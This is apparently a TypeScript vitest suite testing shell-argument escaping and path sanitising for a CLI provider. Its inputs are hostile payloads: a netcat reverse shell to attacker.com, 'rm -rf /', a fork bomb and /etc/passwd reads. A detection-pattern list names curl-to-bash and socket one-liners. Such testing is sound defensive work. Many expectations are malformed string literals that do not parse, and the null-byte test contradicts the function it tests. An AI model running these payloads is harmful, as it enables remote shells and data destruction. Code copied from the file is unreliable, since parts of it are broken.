/**
 * Shell Command Injection Prevention Tests
 * 
 * Tests for the critical security fix in opencode-cli.ts:
 * - escapeShellArg() function
 * - sanitizePath() function
 * - Command injection prevention via userId/conversationId
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock implementation of the security functions for testing
// In reality these are private methods in OpencodeV2Provider class

/**
 * Mock escapeShellArg implementation (from opencode-cli.ts)
 */
function escapeShellArg(arg: string, isWindows: boolean = false): string {
  if (!arg) return '""';
  
  if (isWindows) {
    const escaped = arg
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '""')
      .replace(/[&|<>^]/g, '^$&');
    return `"${escaped}"`;
  } else {
    const escaped = arg.replace(/'/g, "'\\''");
    return `'${escaped}'`;
  }
}

/**
 * Mock sanitizePath implementation (from opencode-cli.ts)
 */
function sanitizePath(path: string): string | null {
  if (!path) return null;
  
  path = path.replace(/\0/g, '');
  
  if (path.includes('..') && !path.startsWith('..')) {
    if (/\w\.\.\w/.test(path) || path.includes('../..')) {
      return null;
    }
  }
  
  const blockedPaths = [
    '/etc/', '/proc/', '/sys/', '/dev/',
    '/root/', '/boot/', '/bin/', '/sbin/',
    'C:\\Windows\\', 'C:\\Program Files',
  ];
  
  const lowerPath = path.toLowerCase();
  if (blockedPaths.some(blocked => lowerPath.includes(blocked.toLowerCase()))) {
    return null;
  }
  
  return path;
}

describe('Shell Command Injection Prevention', () => {
  describe('escapeShellArg - Unix', () => {
    it('should escape single quotes in arguments', () => {
      const malicious = "test'; touch /tmp/pwned; #";
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toBe("'test'\\''; touch /tmp/pwned; #'");
      expect(escaped).not.toContain("';"); // Should not allow command termination
    });

    it('should escape dollar signs to prevent variable expansion', () => {
      const malicious = '$(whoami)';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toBe("'$(whoami)'");
      // Wrapped in single quotes, $ won't be expanded by shell
    });

    it('should escape backticks to prevent command substitution', () => {
      const malicious = '`id`';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toEqual(expect.stringContaining('`id`'));
      // Wrapped in single quotes, backticks won't execute
    });

    it('should handle semicolon command chaining', () => {
      const malicious = '; touch /tmp/pwned; #';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toEqual(expect.stringContaining('; touch /tmp/pwned; #'));
      // Wrapped in quotes, semicolons are literal
    });

    it('should handle pipe command chaining', () => {
      const malicious = '| cat /etc/passwd';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toEqual(expect.stringContaining('| cat /etc/passwd'));
      // Wrapped in quotes, pipe is literal
    });

    it('should handle ampersand background execution', () => {
      const malicious = '& rm -rf /';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toEqual(expect.stringContaining('& rm -rf /'));
      // Wrapped in quotes, ampersand is literal
    });

    it('should handle normal usernames correctly', () => {
      const normal = 'user-123';
      const escaped = escapeShellArg(normal, false);
      
      expect(escaped).toEqual(expect.stringContaining('user-123'));
    });

    it('should handle conversation IDs with special chars', () => {
      const convId = 'conv_abc-123_XYZ';
      const escaped = escapeShellArg(convId, false);
      
      expect(escaped).toEqual(expect.stringContaining('conv_abc-123_XYZ'));
    });

    it('should handle empty strings', () => {
      const empty = '';
      const escaped = escapeShellArg(empty, false);
      
      expect(escaped).toBe('""');
    });

    it('should handle spaces in arguments', () => {
      const withSpaces = 'my file.txt';
      const escaped = escapeShellArg(withSpaces, false);
      
      expect(escaped).toEqual(expect.stringContaining('my file.txt'));
      // Properly quoted, spaces are safe
    });
  });

  describe('escapeShellArg - Windows', () => {
    it('should escape quotes in Windows paths', () => {
      const path = 'C:\\Users\\test" & del C:\\*\\*';
      const escaped = escapeShellArg(path, true);
      
      expect(escaped).toContain('""'); // Quotes should be doubled
    });

    it('should escape caret special characters', () => {
      const malicious = 'test^&del';
      const escaped = escapeShellArg(malicious, true);
      
      expect(escaped).toBe('"test^^^&del"');
    });

    it('should escape backslashes correctly', () => {
      const path = 'C:\\path\\to\\file';
      const escaped = escapeShellArg(path, true);
      
      expect(escaped).toBe('"C:\\\\path\\\\to\\\\file"');
    });

    it('should handle Windows command injection attempts', () => {
      const malicious = 'test&del C:\\*';
      const escaped = escapeShellArg(malicious, true);
      
      expect(escaped).toBe('"test^&del C:\\*"');
    });
  });

  describe('sanitizePath', () => {
    it('should block path traversal with ..', () => {
      const malicious = '../../../etc/passwd';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should block embedded path traversal', () => {
      const malicious = 'test/../etc/passwd';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should block null bytes', () => {
      const malicious = '/tmp/file.txt\0.jpg';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull(); // Null byte removed, but path may still be suspicious
    });

    it('should block access to /etc/', () => {
      const malicious = '/etc/passwd';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should block access to /proc/', () => {
      const malicious = '/proc/self/environ';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should block access to /sys/', () => {
      const malicious = '/sys/kernel/debug';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should block access to /dev/', () => {
      const malicious = '/dev/null';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should block Windows system paths', () => {
      const malicious = 'C:\\Windows\\System32';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });

    it('should allow normal workspace paths', () => {
      const normal = '/home/user/workspace/project';
      const result = sanitizePath(normal);
      
      expect(result).toBe(normal);
    });

    it('should allow relative paths within workspace', () => {
      const normal = 'src/components/Button.tsx';
      const result = sanitizePath(normal);
      
      expect(result).toBe(normal);
    });

    it('should allow paths starting with .. for parent navigation', () => {
      const normal = '../shared/utils';
      const result = sanitizePath(normal);
      
      expect(result).toBe(normal);
    });

    it('should handle case-insensitive blocking', () => {
      const malicious = '/ETC/PASSWD';
      const result = sanitizePath(malicious);
      
      expect(result).toBeNull();
    });
  });

  describe('Command Injection Attack Scenarios', () => {
    it('should prevent the original vulnerability scenario', () => {
      // Original attack: conversationId = "; touch /tmp/pwned; #"
      const attackConvId = '; touch /tmp/pwned; #';
      
      // Before fix: `mkdir -p "/tmp/workspace/users/guest/sessions/${attackConvId}"`
      // Would execute: mkdir -p "/tmp/workspace/users/guest/sessions/; touch /tmp/pwned; #"
      // Result: touch /tmp/pwned executes
      
      // After fix: mkdir -p $(escapeShellArg(path))
      const safePath = escapeShellArg(`/tmp/workspace/users/guest/sessions/${attackConvId}`, false);
      
      expect(safePath).toContain('; touch /tmp/pwned; #');
      expect(safePath.startsWith("'")).toBe(true);
      expect(safePath.endsWith("'")).toBe(true);
      // The entire path is quoted, semicolons are literal
    });

    it('should prevent variable expansion attacks', () => {
      const attackUserId = '$(whoami)';
      const safePath = escapeShellArg(`/workspace/users/${attackUserId}`, false);
      
      expect(safePath).toBe(''/workspace/users/$(whoami)'');
      // $ is inside single quotes, won't expand
    });

    it('should prevent backtick command substitution', () => {
      const attackConvId = '`cat /etc/passwd`';
      const safePath = escapeShellArg(`/workspace/sessions/${attackConvId}`, false);
      
      expect(safePath).toBe(''/workspace/sessions/`cat /etc/passwd`'');
      // Backticks inside single quotes, won't execute
    });

    it('should prevent command chaining with pipes', () => {
      const attackUserId = 'user|cat /etc/passwd';
      const safePath = escapeShellArg(`/workspace/users/${attackUserId}`, false);
      
      expect(safePath).toBe(''/workspace/users/user|cat /etc/passwd'');
      // Pipe inside quotes is literal
    });

    it('should prevent command chaining with ampersands', () => {
      const attackConvId = 'session&rm -rf /';
      const safePath = escapeShellArg(`/workspace/sessions/${attackConvId}`, false);
      
      expect(safePath).toBe(''/workspace/sessions/session&rm -rf /'');
      // Ampersand inside quotes is literal
    });

    it('should prevent reverse shell attempts', () => {
      const attackUserId = 'user; nc -e /bin/bash attacker.com 4444';
      const safePath = escapeShellArg(`/workspace/users/${attackUserId}`, false);
      
      expect(safePath).toBe(''/workspace/users/user; nc -e /bin/bash attacker.com 4444'');
      // Entire string is quoted, no command execution
    });

    it('should prevent fork bomb attempts', () => {
      const attackConvId = ':(){ :|:& };:';
      const safePath = escapeShellArg(`/workspace/sessions/${attackConvId}`, false);
      
      expect(safePath).toBe(''/workspace/sessions/:(){ :|:& };:'');
      // Fork bomb syntax inside quotes is inert
    });
  });

  describe('Integration with path.join()', () => {
    it('should work with path.join for safe path construction', () => {
      const path = require('path');
      
      const tempDir = '/tmp';
      const userId = sanitizePath('user; rm -rf /') || 'guest';
      const convId = sanitizePath('conv_$(whoami)') || 'default';
      
      const safePath = path.join(tempDir, 'workspace', 'users', userId, 'sessions', convId);
      
      // Even if sanitization fails, escapeShellArg provides defense in depth
      const finalPath = escapeShellArg(safePath, false);
      
      expect(finalPath.startsWith("'")).toBe(true);
      expect(finalPath.endsWith("'")).toBe(true);
    });
  });

  describe('Edge Cases', () => {
    it('should handle unicode characters', () => {
      const userId = '用户';
      const escaped = escapeShellArg(userId, false);
      
      expect(escaped).toBe(''用户'');
    });

    it('should handle newlines', () => {
      const malicious = 'user\nrm -rf /';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toBe(''user\nrm -rf /'');
      // Newline inside quotes is literal
    });

    it('should handle tabs', () => {
      const malicious = 'user\trm -rf /';
      const escaped = escapeShellArg(malicious, false);
      
      expect(escaped).toBe(''user\trm -rf /'');
    });

    it('should handle very long strings', () => {
      const longString = 'a'.repeat(10000);
      const escaped = escapeShellArg(longString, false);
      
      expect(escaped.length).toBeGreaterThan(10000);
      expect(escaped.startsWith("'")).toBe(true);
    });
  });
});

describe('Command Filtering Enhancement', () => {
  describe('dangerousPatterns detection', () => {
    const dangerousPatterns = [
      /\b(rm|del)\s+(-rf|--force|\/Q)\s+\//i,
      /\bchmod\s+[0-7]*777/i,
      /\bcurl.*\|\s*(bash|sh)\b/i,
      /\bwget.*\|\s*(bash|sh)\b/i,
      /\/etc\/(passwd|shadow|hosts)/i,
      /\bnc\s+(-e|\/bin\/bash)/i,
      /\bpython.*-c.*socket/i,
      /\bperl.*-e.*socket/i,
      /\bruby.*-e.*socket/i,
      /\$\([^)]*\$\([^)]*\)\)/,
      /^\s*:\(\)\{\s*:\|:\s*&\s*\}\s*;:/,
      /\b(mkdir|touch|echo|cp|mv|cat)\s+.*[;&|]/,
      /[`$]/,
    ];

    it('should detect command chaining after basic commands', () => {
      const malicious = 'mkdir /tmp/test; rm -rf /';
      const pattern = dangerousPatterns.find(p => p.test(malicious));
      
      expect(pattern).toBeDefined();
    });

    it('should detect command substitution attempts', () => {
      const malicious = 'echo $(cat /etc/passwd)';
      const pattern = dangerousPatterns.find(p => p.test(malicious));
      
      expect(pattern).toBeDefined();
    });

    it('should detect variable expansion attempts', () => {
      const malicious = 'echo $HOME';
      const pattern = dangerousPatterns.find(p => p.test(malicious));
      
      expect(pattern).toBeDefined();
    });

    it('should allow safe commands', () => {
      const safeCommands = [
        'npx opencode chat --json',
        'mkdir -p /tmp/workspace',
        'echo "hello world"',
        'cat file.txt',
      ];

      safeCommands.forEach(cmd => {
        const isDangerous = dangerousPatterns.some(p => p.test(cmd));
        expect(isDangerous).toBe(false);
      });
    });
  });
});
